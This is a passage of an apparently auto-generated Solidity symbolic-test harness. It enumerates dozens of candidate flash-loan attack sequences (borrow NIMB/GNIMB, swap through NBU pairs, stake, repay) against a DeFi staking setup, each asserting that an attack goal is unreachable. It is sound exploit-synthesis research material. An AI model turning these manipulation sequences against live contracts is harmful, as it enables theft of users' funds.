        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2760(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2761(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2762(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2763(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2764(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2765(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2766(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2767(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2768(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2769(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2770(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2771(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2772(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2773(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2774(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2775(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2776(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2777(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2778(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2779(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2780(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2781(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2782(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2783(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2784(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2785(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2786(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2787(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2788(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2789(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2790(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2791(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2792(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2793(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2794(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2795(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2796(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2797(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2798(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2799(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2800(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2801(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2802(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2803(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2804(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2805(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2806(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2807(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
